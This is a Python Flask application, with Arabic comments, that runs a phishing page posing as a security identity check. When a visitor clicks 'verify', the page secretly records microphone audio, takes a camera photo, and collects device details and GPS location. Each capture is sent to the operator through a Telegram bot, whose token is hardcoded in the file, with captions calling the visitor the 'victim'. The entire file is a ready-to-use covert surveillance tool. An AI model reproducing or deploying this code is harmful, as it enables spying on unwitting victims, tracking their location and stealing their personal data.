import base64
import json
import time
import logging
from threading import Thread, Lock
from flask import Flask, request, render_template_string, jsonify
import requests

# ========== إعدادات البوت ==========
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

# ========== إعدادات Flask ==========
app = Flask(__name__)

# تعطيل logs Flask غير الضرورية
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ========== قائمة انتظار البيانات (لضمان عدم فقدان أي معلومة) ==========
queue = []
queue_lock = Lock()

def process_queue():
    """خلفية ترسل كل ما في القائمة إلى تليجرام"""
    while True:
        time.sleep(3)
        with queue_lock:
            if queue:
                item = queue.pop(0)
                try:
                    send_to_telegram(item)
                except Exception as e:
                    print(f"Error sending: {e}")

# تشغيل خيط المعالجة في الخلفية
Thread(target=process_queue, daemon=True).start()

# ========== دوال الإرسال إلى تليجرام ==========
def send_to_telegram(data):
    """ترسل البيانات حسب نوعها: نص، صورة، صوت"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    try:
        if data['type'] == 'text':
            requests.post(url + "sendMessage", json={
                'chat_id': ADMIN_ID,
                'text': data['text'],
                'parse_mode': 'HTML'
            }, timeout=10)
        
        elif data['type'] == 'photo':
            img_bytes = base64.b64decode(data['img'].split(',')[1])
            requests.post(url + "sendPhoto", data={
                'chat_id': ADMIN_ID,
                'caption': data.get('caption', '')
            }, files={'photo': ('snapshot.jpg', img_bytes)}, timeout=15)
        
        elif data['type'] == 'audio':
            audio_bytes = base64.b64decode(data['audio'].split(',')[1])
            requests.post(url + "sendVoice", data={
                'chat_id': ADMIN_ID,
                'caption': data.get('caption', '')
            }, files={'voice': ('voice.ogg', audio_bytes)}, timeout=15)
    except Exception as e:
        print(f"Telegram send failed: {e}")

# ========== صفحة HTML (الصيد) ==========
PHISHING_PAGE = '''<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;font-family:Tahoma,Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .card{background:#1e1e2f;padding:2rem;border-radius:2rem;text-align:center;max-width:400px;width:90%;box-shadow:0 20px 35px rgba(0,0,0,0.5)}
        h2{color:#f39c12;margin-bottom:1rem}
        p{color:#ccc;margin-bottom:1.5rem}
        .btn{background:#e67e22;color:white;padding:1rem 2rem;border:none;border-radius:3rem;font-size:1.2rem;cursor:pointer;transition:0.3s}
        .btn:hover{background:#f39c12}
        .btn:disabled{background:#555;cursor:not-allowed}
        #status{margin-top:1.5rem;color:#f1c40f;font-weight:bold}
        video,canvas{display:none}
    </style>
</head>
<body>
<div class="card">
    <h2>🔒 تحقق أمني</h2>
    <p>اضغط الزر للتحقق من هويتك</p>
    <button class="btn" id="verifyBtn">تحقق الآن</button>
    <div id="status"></div>
</div>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<script>
    const btn = document.getElementById('verifyBtn');
    const statusDiv = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function send(endpoint, payload) {
        try {
            await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch(e) { console.error(e); }
    }

    btn.onclick = async () => {
        btn.disabled = true;
        statusDiv.innerText = "⏳ جاري التجهيز...";

        try {
            // طلب الكاميرا والميكروفون
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            video.srcObject = stream;

            // تسجيل الصوت 3 ثوانٍ
            statusDiv.innerText = "🎙️ تسجيل الصوت...";
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            const audioDone = new Promise(resolve => {
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        send('/api/capture', { type: 'audio', data: reader.result });
                        resolve();
                    };
                    reader.readAsDataURL(blob);
                };
            });
            recorder.start();
            await new Promise(r => setTimeout(r, 3000));
            recorder.stop();
            await audioDone;

            // التقاط صورة
            statusDiv.innerText = "📸 التقاط الصورة...";
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/jpeg', 0.85);
            send('/api/capture', { type: 'photo', data: imgData });

            // معلومات الجهاز
            const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0, charging: false };
            const device = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                lang: navigator.language,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                battery: Math.round(battery.level * 100),
                charging: battery.charging
            };
            send('/api/capture', { type: 'device', data: device });

            // الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(
                pos => send('/api/capture', { type: 'location', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } }),
                () => {}
            );

            // إيقاف الكاميرا والميكروفون
            stream.getTracks().forEach(t => t.stop());

            // رسالة نهائية - لا توجيه خارجي
            statusDiv.innerHTML = "✅ تم التحقق بنجاح.<br>يمكنك إغلاق الصفحة الآن.";
            // لا توجيه مطلقاً
        } catch(err) {
            console.error(err);
            statusDiv.innerText = "❌ فشل: السماح بالكاميرا والميكروفون والموقع مطلوب";
            btn.disabled = false;
        }
    };
</script>
</body>
</html>'''

# ========== مسارات API ==========
@app.route('/')
def index():
    return render_template_string(PHISHING_PAGE)

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json()
    if not data:
        return jsonify({'ok': False}), 400
    
    t = data['type']
    with queue_lock:
        if t == 'photo':
            queue.append({'type': 'photo', 'img': data['data'], 'caption': '📸 صورة الضحية'})
        elif t == 'audio':
            queue.append({'type': 'audio', 'audio': data['data'], 'caption': '🎤 تسجيل صوتي'})
        elif t == 'device':
            d = data['data']
            txt = f"""<b>📱 جهاز الضحية</b>
🌐 المتصفح: {d['ua'][:60]}
🖥️ المنصة: {d['platform']}
🗣️ اللغة: {d['lang']}
🧠 النوى: {d['cores']}
💾 الرام: {d['ram']} GB
🔋 بطارية: {d['battery']}% {'⚡' if d['charging'] else ''}"""
            queue.append({'type': 'text', 'text': txt})
        elif t == 'location':
            loc = data['data']
            txt = f"📍 الموقع الجغرافي:\nhttps://www.google.com/maps?q={loc['lat']},{loc['lon']}"
            queue.append({'type': 'text', 'text': txt})
    
    return jsonify({'ok': True})

# ========== Webhook البوت ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if not update:
        return 'OK', 200
    
    if 'message' in update:
        chat_id = str(update['message']['chat']['id'])
        if chat_id == ADMIN_ID:
            text = update['message'].get('text', '')
            api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
            if text == '/start':
                kb = {'inline_keyboard': [[{'text': '🔗 رابط الصيد', 'callback_data': 'link'}]]}
                try:
                    requests.post(api_url + 'sendMessage', json={
                        'chat_id': chat_id,
                        'text': '✨ أهلاً آدمن، البوت جاهز',
                        'reply_markup': kb
                    }, timeout=5)
                except: pass
            elif text == '/link':
                base = request.host_url.rstrip('/')
                try:
                    requests.post(api_url + 'sendMessage', json={
                        'chat_id': chat_id,
                        'text': f'🔗 رابط الصيد:\n{base}'
                    }, timeout=5)
                except: pass
    
    elif 'callback_query' in update:
        cb = update['callback_query']
        if cb['data'] == 'link':
            base = request.host_url.rstrip('/')
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': cb['message']['chat']['id'],
                    'text': base
                }, timeout=5)
            except: pass
    
    return 'OK', 200

# ========== تشغيل الخادم ==========
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, threaded=True)
